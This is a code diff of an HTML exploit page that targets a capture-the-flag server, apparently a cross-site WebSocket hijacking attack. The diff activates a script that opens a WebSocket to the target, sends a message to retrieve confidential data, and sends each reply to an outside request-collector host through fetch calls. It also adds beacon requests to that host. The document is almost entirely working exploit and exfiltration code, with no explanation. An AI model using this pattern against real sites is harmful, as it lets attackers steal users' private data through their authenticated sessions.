@@ -41,12 +41,15 @@
         document.getElementsByTagName('body')[0].appendChild(iframe);
 	</script>
 	
-	<!--
+	
 	<script>
+		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?1', {mode: 'no-cors'})
 		var ws = new WebSocket('ws://ctf21.root-me.org/ws');
+		fetch('https://en6gc9c8vfzvo.x.pipedream.net/?2', {mode: 'no-cors'})
 		ws.onopen = start
 		ws.onmessage = handleReply
 		function start(event) {
+		  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?3', {mode: 'no-cors'})
 		  ws.send('hello'); //Send the message to retreive confidential information
 		}
 		function handleReply(event) {
@@ -54,7 +57,7 @@
 		  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
 		}
 	</script>
-	-->
+	
 </body>
 
 <!--
